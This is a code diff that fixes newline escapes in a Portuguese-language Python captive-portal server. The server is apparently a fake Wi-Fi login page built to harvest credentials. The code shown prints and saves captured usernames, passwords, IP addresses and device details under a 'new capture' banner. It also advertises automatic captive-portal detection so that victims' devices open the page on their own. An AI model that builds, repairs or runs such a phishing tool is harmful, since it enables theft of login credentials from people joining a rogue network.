@@ -28,8 +28,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(CONFIG['log_file'], 'a') as f:
-            f.write("{0} - {1} - {2}
-".format(timestamp, self.address_string(), format % args))
+            f.write("{0} - {1} - {2}\n".format(timestamp, self.address_string(), format % args))
     
     def do_GET(self):
         # Lista de URLs de verificacao de conectividade de diferentes sistemas
@@ -99,8 +98,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             
             self.save_credentials(credential_entry)
             
-            print("
-" + "="*70)
+            print("\n" + "="*70)
             print("  [NOVA CAPTURA]")
             print("="*70)
             print("  Timestamp: {0}".format(credential_entry['timestamp']))
@@ -108,8 +106,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             print("  Senha: {0}".format(password))
             print("  IP: {0}".format(credential_entry['ip']))
             print("  Device: {0}".format(credential_entry['user_agent'][:50]))
-            print("="*70 + "
-")
+            print("="*70 + "\n")
             
             self.send_response(302)
             self.send_header('Location', CONFIG['redirect_url'])
@@ -183,25 +180,19 @@ def run_server():
     print("  [+] Credenciais: {0}".format(CONFIG['credentials_file']))
     print("  [+] Logs: {0}".format(CONFIG['log_file']))
     print("  [+] Deteccao Captive Portal: ATIVADA")
-    print("
-  " + "="*66)
+    print("\n  " + "="*66)
     print("  [*] ACESSE O PORTAL VIA:")
     print("  [*] http://{0}:{1}".format(local_ip, port))
     print("  " + "="*66)
-    print("
-  [*] Servidor rodando com deteccao automatica...")
+    print("\n  [*] Servidor rodando com deteccao automatica...")
     print("  [*] Dispositivos podem abrir o portal automaticamente!")
-    print("  [*] Pressione Ctrl+C para parar
-")
+    print("  [*] Pressione Ctrl+C para parar\n")
     
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("
-
-  [!] Servidor encerrado pelo usuario")
-        print("  [!] Total de capturas salvas em: {0}
-".format(CONFIG['credentials_file']))
+        print("\n\n  [!] Servidor encerrado pelo usuario")
+        print("  [!] Total de capturas salvas em: {0}\n".format(CONFIG['credentials_file']))
         sys.exit(0)
 
 if __name__ == '__main__':
